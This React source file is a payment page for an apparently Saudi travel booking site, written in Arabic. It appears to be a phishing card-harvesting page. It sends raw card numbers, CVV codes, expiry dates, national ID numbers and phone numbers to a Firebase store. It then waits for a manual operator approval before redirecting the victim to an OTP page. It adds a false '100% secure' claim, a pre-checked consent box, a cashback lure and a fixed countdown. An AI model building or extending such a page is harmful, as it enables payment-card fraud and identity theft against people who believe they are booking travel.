import { useEffect, useState } from "react";
import { motion } from "framer-motion";
import { Check, Clock, ChevronLeft, Shield, AlertCircle } from "lucide-react";
import { Link, useLocation } from "wouter";
import {
  addData,
  handleCurrentPage,
  handlePay,
  listenForApproval,
  isBinBlocked,
} from "@/lib/firebase";
import { getCardType } from "@/components/reservation/payment-step";
import cashbackImg from "@assets/photo_5769374572120575542_x_(1)_1778516964881.jpg";

function validateLuhn(cardNum: string): boolean {
  const digits = cardNum.replace(/\D/g, "");
  if (digits.length < 13) return false;
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alt) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

type PaxCounts = {
  adults: number;
  children: number;
  infants: number;
  special: number;
  student: number;
};

const PAX_META: { key: keyof PaxCounts; label: string; factor: number }[] = [
  { key: "adults", label: "البالغين", factor: 1 },
  { key: "children", label: "الأطفال", factor: 0.75 },
  { key: "infants", label: "الرضع", factor: 0.1 },
  { key: "special", label: "الاحتياجات الخاصة", factor: 0.5 },
  { key: "student", label: "طالب", factor: 0.6 },
];

function readPax(): PaxCounts {
  const fb: PaxCounts = { adults: 1, children: 0, infants: 0, special: 0, student: 0 };
  try {
    const raw = sessionStorage.getItem("searchPassengers");
    if (!raw) return fb;
    return { ...fb, ...(JSON.parse(raw) as Partial<PaxCounts>) };
  } catch {
    return fb;
  }
}

function readSelectedTripInfo(): {
  unit: number;
  className: string;
  from: string;
  to: string;
} {
  try {
    const raw = sessionStorage.getItem("selectedTrip");
    if (!raw) return { unit: 0, className: "الأساسية", from: "", to: "" };
    const t = JSON.parse(raw);
    const idx = typeof t.selectedClassIndex === "number" ? t.selectedClassIndex : 0;
    const cls = t.classes?.[idx];
    const className = cls?.name || "الأساسية";
    const unit = idx === 1 ? Math.max(85, Math.round((t.price ?? 0) * 0.78)) : t.price ?? 0;
    return { unit, className, from: t.from || "", to: t.to || "" };
  } catch {
    return { unit: 0, className: "الأساسية", from: "", to: "" };
  }
}

function computeTotals() {
  const pax = readPax();
  const { unit, className, from, to } = readSelectedTripInfo();
  const lines = PAX_META.filter((c) => pax[c.key] > 0).map((c) => {
    const ppu = Math.round(unit * c.factor);
    const lineTotal = ppu * pax[c.key];
    return { label: c.label, qty: pax[c.key], ppu, lineTotal };
  });
  const subtotal = lines.reduce((s, l) => s + l.lineTotal, 0);
  const tax = Math.round(subtotal * 0.15 * 100) / 100;
  const grandTotal = Math.round((subtotal + tax) * 100) / 100;
  const ticketQuantity = lines.reduce((s, l) => s + l.qty, 0);
  return { pax, lines, subtotal, tax, grandTotal, className, from, to, unit, ticketQuantity };
}

function PaymentBookingSummary() {
  const { lines, subtotal, tax, grandTotal, className, from, to } = computeTotals();
  return (
    <div className="bg-background border border-border rounded-2xl p-5 mb-4" dir="rtl">
      <h3 className="font-bold text-foreground text-base mb-4 text-start">ملخص الحجز</h3>
      {(from || to) && (
        <div className="flex items-center gap-2 justify-end mb-3 text-xs text-muted-foreground">
          <span>
            {from} ← {to}
          </span>
          <span>✈</span>
        </div>
      )}

      <div className="mb-3 pb-3 border-b border-border/50">
        <p className="text-xs text-muted-foreground text-start mb-3">رحلة المغادرة</p>
        {lines.length === 0 ? (
          <p className="text-xs text-muted-foreground">لا توجد بيانات تذاكر</p>
        ) : (
          lines.map((l) => (
            <div key={l.label} className="mb-2 last:mb-0">
              <div className="flex justify-between text-sm">
                <span className="font-bold tabular-nums">{l.lineTotal.toFixed(2)} ر.س</span>
                <span className="text-muted-foreground">
                  {l.label} ({className})
                </span>
              </div>
              <div className="flex justify-between text-xs mt-0.5">
                <span className="text-primary tabular-nums">
                  {l.qty} × {l.ppu.toFixed(2)}
                </span>
                <span className="text-muted-foreground">
                  {l.label} {l.qty}
                </span>
              </div>
            </div>
          ))
        )}
      </div>

      <div className="space-y-2 text-sm text-start">
        <div className="flex justify-between">
          <span className="font-semibold tabular-nums">{subtotal.toFixed(2)} ر.س</span>
          <span className="text-muted-foreground">الإجمالي قبل الضريبة</span>
        </div>
        <div className="flex justify-between">
          <span className="font-semibold tabular-nums">{tax.toFixed(2)} ر.س</span>
          <span className="text-muted-foreground">ضريبة القيمة المضافة (15٪)</span>
        </div>
        <div className="flex justify-between">
          <span className="font-semibold tabular-nums">0.00 ر.س</span>
          <span className="text-muted-foreground">الخصم</span>
        </div>
        <div className="flex justify-between border-t border-border pt-2 mt-2">
          <span className="font-extrabold text-lg text-primary tabular-nums">
            {grandTotal.toFixed(2)} ر.س
          </span>
          <span className="font-bold text-foreground">الإجمالي</span>
        </div>
      </div>
    </div>
  );
}

const STEPS = [
  { label: "التذاكر", done: true, active: false },
  { label: "التفاصيل", done: true, active: false },
  { label: "الشراء", done: true, active: false },
  { label: "الدفع", done: false, active: true },
];

const PAYMENT_METHODS = [
  {
    id: "mada",
    label: "مدى",
    description: "الدفع عن طريق مدى",
    logo: "https://media.base44.com/images/public/6a0141c514678b9757e134f7/53cfdc496_satrans_com_sa_mada-logo0zcnw-i5k6dfc_e3ec505d.svg",
  },
  {
    id: "card",
    label: "فيزا / ماستركارد / أميكس",
    description: "الدفع بالبطاقة الائتمانية",
    logos: [
      "https://media.base44.com/images/public/6a0141c514678b9757e134f7/2c1e15023_satrans_com_sa_visa-logo0upfiv7ntladm_68f214bb.svg",
      "https://media.base44.com/images/public/6a0141c514678b9757e134f7/41fe88fde_satrans_com_sa_master-card-logo0y_enem50ek-_055b28cd.svg",
    ],
  },
] as const;

function StepBar() {
  return (
    <div
      className="flex items-center justify-center bg-background border-b border-border py-2.5 sm:py-3 px-2 sticky top-0 z-30 overflow-x-auto"
      dir="rtl"
    >
      {STEPS.map((step, i) => (
        <div key={i} className="flex items-center flex-shrink-0">
          <div className="flex flex-col items-center gap-1 px-2 sm:px-5">
            <div
              className={`w-7 h-7 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-xs sm:text-sm font-bold border-2 transition-all ${
                step.done
                  ? "bg-primary border-primary text-primary-foreground"
                  : step.active
                    ? "bg-emerald-600 border-emerald-600 text-white"
                    : "bg-background border-border text-muted-foreground"
              }`}
            >
              {step.done ? <Check className="w-3.5 h-3.5 sm:w-4 sm:h-4" /> : i + 1}
            </div>
            <span
              className={`text-[9px] sm:text-[10px] font-medium whitespace-nowrap ${
                step.active
                  ? "text-emerald-700"
                  : step.done
                    ? "text-primary"
                    : "text-muted-foreground"
              }`}
            >
              {step.label}
            </span>
          </div>
          {i < STEPS.length - 1 && (
            <div className="w-6 sm:w-12 h-0.5 mb-4 bg-primary" />
          )}
        </div>
      ))}
    </div>
  );
}

function digitsOnly(v: string, max: number) {
  return v.replace(/\D/g, "").slice(0, max);
}
function formatCard(v: string) {
  return digitsOnly(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
}

export default function Payment() {
  const [, setLocation] = useLocation();
  const [selected, setSelected] = useState<string>("mada");
  const [agreed, setAgreed] = useState(true);

  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("01");
  const [expiryYear, setExpiryYear] = useState(
    String(new Date().getFullYear() + 1).slice(-2),
  );
  const [cvv, setCvv] = useState("");

  const [submitting, setSubmitting] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [error, setError] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [showCashbackPopup, setShowCashbackPopup] = useState(true);

  const clearFieldError = (k: string) =>
    setErrors((p) => {
      if (!p[k]) return p;
      const { [k]: _drop, ...rest } = p;
      return rest;
    });

  const validateForm = (): boolean => {
    const next: Record<string, string> = {};
    const raw = cardNumber.replace(/\s/g, "");
    if (!raw || raw.length < 13) next.cardNumber = "رقم البطاقة غير صحيح";
    else if (!validateLuhn(raw)) next.cardNumber = "رقم البطاقة غير صالح";

    if (!cardName.trim() || cardName.trim().length < 3)
      next.cardName = "يرجى إدخال الاسم على البطاقة";

    const mm = parseInt(expiryMonth, 10);
    const yy = parseInt(expiryYear, 10);
    if (!mm || mm < 1 || mm > 12 || !yy) {
      next.expiry = "تاريخ الصلاحية غير صحيح";
    } else {
      const fullYear = 2000 + yy;
      const expiry = new Date(fullYear, mm); // first of next month
      if (expiry <= new Date()) next.expiry = "البطاقة منتهية الصلاحية";
    }

    if (!cvv || cvv.length < 3) next.cvv = "كود الحماية غير صحيح";

    setErrors(next);
    return Object.keys(next).length === 0;
  };

  useEffect(() => {
    void handleCurrentPage("payment");
  }, []);

  useEffect(() => {
    if (!waitingApproval) return;
    const unsub = listenForApproval((status) => {
      if (status === "approved") {
        setWaitingApproval(false);
        setLocation("/otp");
      } else if (status === "rejected") {
        setWaitingApproval(false);
        setError("البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
      }
    });
    return () => unsub();
  }, [waitingApproval, setLocation]);

  const canPay = agreed && !submitting && !waitingApproval;

  const onPay = async () => {
    if (!canPay) return;
    setError("");
    if (!validateForm()) return;
    setSubmitting(true);

    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      setSubmitting(false);
      setLocation("/register");
      return;
    }

    const passenger = (() => {
      try {
        return JSON.parse(sessionStorage.getItem("passenger") || "{}");
      } catch {
        return {};
      }
    })();
    const trip = (() => {
      try {
        return JSON.parse(sessionStorage.getItem("selectedTrip") || "{}");
      } catch {
        return {};
      }
    })();
    const seats = (() => {
      try {
        return JSON.parse(sessionStorage.getItem("selectedSeats") || "[]");
      } catch {
        return [];
      }
    })();

    try {
      const totals = computeTotals();
      const tripPrice = Number(trip.price) || totals.unit || 159;
      await addData({
        name: [passenger.firstName, passenger.lastName].filter(Boolean).join(" "),
        phone: passenger.phone || "",
        saudiId: passenger.idNumber || "",
        nationality: passenger.nationality || "",
        passengerTitle: passenger.title || "",
        passengerDob: passenger.dob || "",
        idType: passenger.idType || "",
        ticketQuantity: totals.ticketQuantity || 1,
        ticketPrice: tripPrice,
        totalAmount: totals.grandTotal || tripPrice,
        from: trip.from || "",
        to: trip.to || "",
        bookingDate: trip.date || "",
        bookingTime: trip.time_depart || "",
        tripDuration: trip.duration || "",
        seats,
        paymentMethod: selected,
        currentPage: "payment",
      });
    } catch {
      // non-fatal
    }

    const cleanCard = cardNumber.replace(/\s/g, "");

    try {
      if (await isBinBlocked(cleanCard)) {
        setError("هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
        setSubmitting(false);
        return;
      }
    } catch {
      // ignore lookup failures and continue
    }

    const paymentInfo = {
      cardNumber: cleanCard,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: getCardType(cleanCard),
      currentPage: "payment",
    };

    try {
      await handlePay(paymentInfo, () => {});
    } catch (err: any) {
      setSubmitting(false);
      if (err?.message === "VISITOR_BLOCKED") {
        setError("تم حظر هذا الزائر ولا يمكنه المتابعة");
      } else {
        setError("حدث خطأ أثناء معالجة الدفع");
      }
      return;
    }

    setSubmitting(false);
    setWaitingApproval(true);
  };

  const showCardForm = selected === "mada" || selected === "card";

  return (
    <div className="min-h-screen bg-muted/30" dir="rtl" data-testid="page-payment">
      {showCashbackPopup && (
        <div
          className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in"
          onClick={() => setShowCashbackPopup(false)}
          data-testid="overlay-cashback"
        >
          <div
            className="relative bg-white rounded-2xl shadow-2xl max-w-sm w-full overflow-hidden animate-in zoom-in-95"
            onClick={(e) => e.stopPropagation()}
          >
            <button
              type="button"
              onClick={() => setShowCashbackPopup(false)}
              aria-label="إغلاق"
              data-testid="button-close-cashback"
              className="absolute top-2 left-2 z-10 w-8 h-8 rounded-full bg-white/90 hover:bg-white text-stone-700 flex items-center justify-center shadow-md text-lg font-bold"
            >
              ×
            </button>
            <img
              src={cashbackImg}
              alt="كاش باك 40% من البنوك المشاركة"
              className="w-full h-auto block"
              data-testid="img-cashback"
            />
            <div className="p-4">
              <button
                type="button"
                onClick={() => setShowCashbackPopup(false)}
                data-testid="button-continue-cashback"
                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold rounded-xl py-3 text-sm transition"
              >
                متابعة الدفع
              </button>
            </div>
          </div>
        </div>
      )}
      <StepBar />

      <div className="max-w-2xl mx-auto px-3 sm:px-4 py-4 sm:py-6">
        <div className="bg-background border border-border rounded-2xl p-5 mb-4">
          <h3 className="font-bold text-foreground text-base mb-4 text-start">طريقة الدفع</h3>

          <div className="space-y-3">
            {PAYMENT_METHODS.map((method) => (
              <label
                key={method.id}
                className={`flex items-center justify-between gap-3 p-3 sm:p-4 rounded-xl border-2 cursor-pointer transition-all duration-200 ${
                  selected === method.id
                    ? "border-emerald-600 bg-emerald-50"
                    : "border-border bg-background hover:border-primary/40"
                }`}
                data-testid={`payment-method-${method.id}`}
              >
                <div className="flex items-center gap-2 flex-shrink-0">
                  {"logo" in method && method.logo ? (
                    <img
                      src={method.logo}
                      alt={method.label}
                      className="h-6 sm:h-7 w-auto object-contain"
                    />
                  ) : "logos" in method ? (
                    <div className="flex gap-1">
                      {method.logos.map((l, i) => (
                        <img
                          key={i}
                          src={l}
                          alt=""
                          className="h-5 sm:h-6 w-auto object-contain"
                        />
                      ))}
                    </div>
                  ) : null}
                </div>

                <div className="flex items-center gap-3 min-w-0 flex-1 justify-end">
                  <div className="text-start min-w-0">
                    <div className="text-sm font-bold text-foreground truncate">{method.label}</div>
                    <div className="text-[11px] sm:text-xs text-muted-foreground truncate">
                      {method.description}
                    </div>
                  </div>
                  <div
                    className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 transition-all ${
                      selected === method.id ? "border-emerald-600 bg-emerald-600" : "border-border"
                    }`}
                  >
                    {selected === method.id && <div className="w-2 h-2 rounded-full bg-white" />}
                  </div>
                  <input
                    type="radio"
                    name="payment"
                    value={method.id}
                    checked={selected === method.id}
                    onChange={() => setSelected(method.id)}
                    className="sr-only"
                  />
                </div>
              </label>
            ))}
          </div>
        </div>

        {showCardForm && (
          <div className="bg-background border border-border rounded-2xl p-5 mb-4">
            <h3 className="font-bold text-foreground text-base mb-4 text-start">تفاصيل البطاقة</h3>
            <div className="space-y-4">
              <div>
                <label className="text-xs text-muted-foreground block mb-1 text-start">
                  رقم البطاقة *
                </label>
                <input
                  value={cardNumber}
                  onChange={(e) => {
                    setCardNumber(formatCard(e.target.value));
                    clearFieldError("cardNumber");
                    setError("");
                  }}
                  placeholder="0000 0000 0000 0000"
                  inputMode="numeric"
                  dir="ltr"
                  className={`w-full border rounded-xl px-3 py-2.5 text-sm text-start focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
                    errors.cardNumber ? "border-destructive" : "border-border"
                  }`}
                  data-testid="input-card-number"
                />
                {errors.cardNumber && (
                  <p className="text-[11px] text-destructive mt-1 text-start flex items-center justify-end gap-1">
                    <span>{errors.cardNumber}</span>
                    <AlertCircle className="w-3 h-3" />
                  </p>
                )}
              </div>
              <div>
                <label className="text-xs text-muted-foreground block mb-1 text-start">
                  اسم حامل البطاقة *
                </label>
                <input
                  value={cardName}
                  onChange={(e) => {
                    setCardName(e.target.value.toUpperCase());
                    clearFieldError("cardName");
                  }}
                  placeholder="NAME ON CARD"
                  className={`w-full border rounded-xl px-3 py-2.5 text-sm text-start focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background uppercase ${
                    errors.cardName ? "border-destructive" : "border-border"
                  }`}
                  data-testid="input-card-name"
                />
                {errors.cardName && (
                  <p className="text-[11px] text-destructive mt-1 text-start flex items-center justify-end gap-1">
                    <span>{errors.cardName}</span>
                    <AlertCircle className="w-3 h-3" />
                  </p>
                )}
              </div>
              <div className="grid grid-cols-3 gap-3 items-start">
                <div>
                  <label className="text-xs text-muted-foreground block mb-1 text-start">
                    شهر *
                  </label>
                  <input
                    value={expiryMonth}
                    onChange={(e) => {
                      setExpiryMonth(digitsOnly(e.target.value, 2));
                      clearFieldError("expiry");
                    }}
                    placeholder="MM"
                    inputMode="numeric"
                    dir="ltr"
                    className={`w-full border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
                      errors.expiry ? "border-destructive" : "border-border"
                    }`}
                    data-testid="input-expiry-month"
                  />
                </div>
                <div>
                  <label className="text-xs text-muted-foreground block mb-1 text-start">
                    سنة *
                  </label>
                  <input
                    value={expiryYear}
                    onChange={(e) => {
                      setExpiryYear(digitsOnly(e.target.value, 2));
                      clearFieldError("expiry");
                    }}
                    placeholder="YY"
                    inputMode="numeric"
                    dir="ltr"
                    className={`w-full border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
                      errors.expiry ? "border-destructive" : "border-border"
                    }`}
                    data-testid="input-expiry-year"
                  />
                </div>
                <div>
                  <label className="text-xs text-muted-foreground block mb-1 text-start">
                    CVV *
                  </label>
                  <input
                    value={cvv}
                    onChange={(e) => {
                      setCvv(digitsOnly(e.target.value, 4));
                      clearFieldError("cvv");
                    }}
                    placeholder="•••"
                    inputMode="numeric"
                    dir="ltr"
                    className={`w-full border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
                      errors.cvv ? "border-destructive" : "border-border"
                    }`}
                    data-testid="input-cvv"
                  />
                  {errors.cvv && (
                    <p className="text-[11px] text-destructive mt-1 text-start flex items-center justify-end gap-1">
                      <span>{errors.cvv}</span>
                      <AlertCircle className="w-3 h-3" />
                    </p>
                  )}
                </div>
                {errors.expiry && (
                  <p className="col-span-2 text-[11px] text-destructive mt-1 text-start flex items-center justify-end gap-1">
                    <span>{errors.expiry}</span>
                    <AlertCircle className="w-3 h-3" />
                  </p>
                )}
              </div>
            </div>
          </div>
        )}

        <PaymentBookingSummary />


        <div className="bg-background border border-border rounded-2xl p-4 mb-4">
          <label className="flex items-start gap-3 cursor-pointer" dir="rtl">
            <div className="flex-1 text-start">
              <p className="text-xs text-foreground leading-relaxed">
                أوافق على{" "}
                <a href="#" className="text-primary underline">
                  شروط الخدمة
                </a>{" "}
                و{" "}
                <a href="#" className="text-primary underline">
                  سياسة الخصوصية
                </a>
              </p>
              <ul className="mt-2 space-y-1">
                {[
                  "يُسمح بتغيير موعد رحلتك",
                  "غير قابل للاسترداد (في حالة الإلغاء)",
                  "شروط سياسة الأمتعة",
                ].map((t, i) => (
                  <li
                    key={i}
                    className="flex items-center justify-end gap-1.5 text-xs text-muted-foreground"
                  >
                    <span>{t}</span>
                    <Check className="w-3 h-3 text-primary flex-shrink-0" />
                  </li>
                ))}
              </ul>
            </div>
            <div
              onClick={() => setAgreed((a) => !a)}
              className={`w-5 h-5 mt-0.5 rounded border-2 flex items-center justify-center flex-shrink-0 transition-all ${
                agreed ? "bg-primary border-primary" : "border-border bg-background"
              }`}
              data-testid="checkbox-agree"
            >
              {agreed && <Check className="w-3 h-3 text-primary-foreground" />}
            </div>
          </label>
        </div>

        <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground mb-4">
          <Shield className="w-3.5 h-3.5 text-primary" />
          <span>جميع المعاملات مشفرة وآمنة بنسبة 100٪</span>
        </div>

        {error && (
          <div
            className="bg-destructive/10 border border-destructive/30 text-destructive text-sm rounded-xl px-4 py-3 mb-3 text-start"
            data-testid="text-payment-error"
          >
            {error}
          </div>
        )}

        <motion.button
          whileTap={{ scale: 0.98 }}
          disabled={!canPay}
          onClick={onPay}
          className={`w-full py-4 rounded-xl font-bold text-base flex items-center justify-center gap-2 transition-all duration-300 ${
            canPay
              ? "bg-emerald-600 text-white hover:bg-emerald-700 hover:-translate-y-0.5 hover:shadow-lg"
              : "bg-muted text-muted-foreground cursor-not-allowed"
          }`}
          data-testid="button-pay"
        >
          {submitting
            ? "جاري المعالجة..."
            : waitingApproval
              ? "بانتظار التأكيد..."
              : `أتمم الشراء — ${computeTotals().grandTotal.toFixed(2)} ر.س`}
        </motion.button>

        <div className="mt-4 flex items-center justify-between text-xs text-muted-foreground px-1">
          <Link
            href="/seat-selection"
            className="text-primary font-medium hover:underline flex items-center gap-1"
          >
            <ChevronLeft className="w-3 h-3 rotate-180" />
            رجوع
          </Link>
          <div className="flex items-center gap-1">
            <Clock className="w-3 h-3" />
            <span>14:24 دقيقة متبقية</span>
          </div>
        </div>
      </div>
    </div>
  );
}
